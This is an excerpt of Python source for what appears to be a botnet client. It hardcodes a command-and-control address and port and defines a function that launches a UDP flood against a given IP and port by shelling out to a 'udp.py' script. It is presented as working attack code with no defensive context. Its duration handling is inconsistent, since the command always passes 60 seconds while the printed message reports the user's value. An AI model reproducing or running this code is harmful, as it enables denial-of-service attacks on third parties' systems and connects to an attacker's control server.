...
KRYPTONC2_ADDRESS  = "176.65.148.181"
KRYPTONC2_PORT  = 5511
...
def attack_udp(ip, port, secs, size):
    try:
        ...
        print("Invalid duration - using 60s default")
        secs = 60

    cmd = f"python3 udp.py {ip} {port} 60"
    print(f"[*] Starting UDP flood on {ip}:{port} for {secs}s (full power 1024-byte mode)")
    
    # Run original udp.py directly - keeps max bandwidth
    os.system(cmd)
